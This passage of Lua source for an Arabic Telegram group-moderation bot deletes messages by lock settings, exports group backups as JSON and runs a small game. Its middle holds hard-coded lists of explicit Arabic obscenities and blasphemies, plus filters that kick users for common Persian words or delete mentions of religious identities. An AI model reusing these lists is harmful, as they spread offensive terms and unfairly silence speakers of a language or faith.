DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source LanZo     --
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source LanZo     --
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source LanZo     --
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source LanZo     --
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source LanZo     --
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevaMeR:get(LanZo..'aMeR:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not DevaMeR:get(LanZo..'aMeR:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevaMeR:get(LanZo..'aMeR:Spam:Text'..msg.chat_id_))
end
if DevaMeR:get(LanZo..'aMeR:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
--     Source LanZo     --
if DevaMeR:get(LanZo.."aMeR:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"᥀︙تم الغاء حفظ الرابط")       
DevaMeR:del(LanZo.."aMeR:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevaMeR:set(LanZo.."aMeR:Groups:Links"..msg.chat_id_,Link)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرابط بنجاح', 1, 'md')
DevaMeR:del(LanZo.."aMeR:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false 
end
end
--     Source LanZo     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevaMeR:get('LanZoTeam:'..LanZo.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevaMeR:del('LanZoTeam:'..LanZo..'id:user'..msg.chat_id_)  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevaMeR:del('LanZoTeam:'..LanZo.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevaMeR:del('LanZoTeam:'..LanZo.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevaMeR:get('LanZoTeam:'..LanZo..'id:user'..msg.chat_id_)  
DevaMeR:incrby(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_aMeR(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' رساله', 1, 'md')
DevaMeR:del('LanZoTeam:'..LanZo..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevaMeR:get('LanZoTeam:'..LanZo.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevaMeR:del('LanZoTeam:'..LanZo..'ids:user'..msg.chat_id_)  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevaMeR:del('LanZoTeam:'..LanZo.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevaMeR:del('LanZoTeam:'..LanZo.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevaMeR:get('LanZoTeam:'..LanZo..'ids:user'..msg.chat_id_)  
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_aMeR(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' نقطه', 1, 'md')
DevaMeR:del('LanZoTeam:'..LanZo..'ids:user'..msg.chat_id_)  
end
end
--     Source LanZo     --
if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
if not DevaMeR:get(LanZo.."aMeR:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع الفشار في المجموعه")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevaMeR:get(LanZo.."aMeR:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevaMeR:get(LanZo.."aMeR:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevaMeR:get(LanZo.."aMeR:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع الكفر في المجموعه") 
end end
if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
if not DevaMeR:get(LanZo.."aMeR:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالطائفيه هنا") 
end end
--     Source LanZo     --
if SecondSudo(msg) then
if text == 'جلب نسخه الكروبات' and ChCheck(msg) or text == 'جلب نسخه احتياطيه' and ChCheck(msg) or text == 'جلب النسخه الاحتياطيه' and ChCheck(msg) or text == '↫ جلب نسخه احتياطيه ᥀' and ChCheck(msg) then
local List = DevaMeR:smembers(LanZo..'aMeR:Groups') 
local BotName = (DevaMeR:get(LanZo.."aMeR:NameBot") or 'لانزو')
local GetJson = '{"BotId": '..LanZo..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevaMeR:get(LanZo.."aMeR:Groups:Links"..v)
Welcomes = DevaMeR:get(LanZo..'aMeR:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
aMeRConstructors = DevaMeR:smembers(LanZo..'aMeR:aMeRConstructor:'..v)
Constructors = DevaMeR:smembers(LanZo..'aMeR:BasicConstructor:'..v)
BasicConstructors = DevaMeR:smembers(LanZo..'aMeR:Constructor:'..v)
Managers = DevaMeR:smembers(LanZo..'aMeR:Managers:'..v)
Admis = DevaMeR:smembers(LanZo..'aMeR:Admins:'..v)
Vips = DevaMeR:smembers(LanZo..'aMeR:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #aMeRConstructors ~= 0 then
GetJson = GetJson..'"aMeRConstructors":['
for k,v in pairs(aMeRConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..LanZo..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..LanZo..'.json', '᥀︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..LanZo..'.json')
end
if text and (text == 'رفع النسخه' or text == 'رفع النسخه الاحتياطيه' or text == 'رفع نسخه الاحتياطيه') and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source LanZo     --
if DevaMeR:get(LanZo.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_aMeR( msg.chat_id_, msg.id_, 1,"᥀︙يوجد فقط ( 6 ) اختيارات\n᥀︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevaMeR:get(LanZo.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevaMeR:del(LanZo.."SET:GAME"..msg.chat_id_)   
Dev_aMeR( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevaMeR:del(LanZo.."SET:GAME"..msg.chat_id_)   
Dev_aMeR( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevaMeR:get(LanZo..'DevaMeR4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "᥀︙تم الغاء الامر")
DevaMeR:del(LanZo..'DevaMeR4'..msg.sender_user_id_)
return false  end 
DevaMeR:del(LanZo..'DevaMeR4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '᥀︙المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '᥀︙عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '᥀︙عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'᥀︙البوت ادمن في القناة \n᥀︙تم تفعيل الاشتراك الاجباري \n᥀︙ايدي القناة ↫ '..data.id_..'\n᥀︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
DevaMeR:set(LanZo..'aMeR:ChId',data.id_)
else
send(msg.chat_id_, msg.id_,'᥀︙عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
--     Source LanZo     --
if DevaMeR:get(LanZo.."aMeR:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevaMeR:del(LanZo.."aMeR:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
